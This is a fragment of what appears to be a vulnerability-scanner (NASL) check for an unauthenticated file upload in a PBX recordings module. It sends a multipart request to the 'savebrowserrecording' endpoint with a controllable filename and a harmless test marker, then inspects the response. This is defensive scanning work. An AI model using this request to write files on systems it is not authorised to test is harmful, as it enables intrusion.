...
func _run( file, port, host, vtstrings ){
	var file, port;
	var post_data, req, buf, fs, rep_file;
	post_data = NASLString( "\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"extension\"\r\n\r\n", "0\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"language\"\r\n\r\n", "de\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"filename\"\r\n\r\n", file, "\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"systemrecording\"\r\n\r\n\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"id\"\r\n\r\n", "1\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"name\"\r\n\r\n", "aaaa\r\n", "------------", vtstrings["default"], "\r\n", "Content-Disposition: form-data; name=\"file\"; filename=\"", vtstrings["default"], "\"\r\n", "Content-Type: audio/mpeg\r\n\r\n", vtstrings["default"], " Test for https://www.exploit-db.com/exploits/40232/\r\n", "------------", vtstrings["default"], "--" );
	req = http_post_put_req( port: port, url: " /admin/ajax.php?module=recordings&command=savebrowserrecording ", data: post_data, add_headers: make_array( "Content-Type", NASLString( "multipart/form-data; boundary=----------", vtstrings["default"] ), "Referer", "http://" + host + "/" ) );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!IsMatchRegexp( buf, "HTTP/1\\.. 200" ) || !ContainsString( buf, "status\":true" ) || !ContainsString( buf, "filename\"" )){
		return;
	}
	...
	req = http_post_put_req( port: port, url: "/admin/ajax.php", data: post_data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8", "Referer", "http://" + host + "/" ) );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	return buf;
}
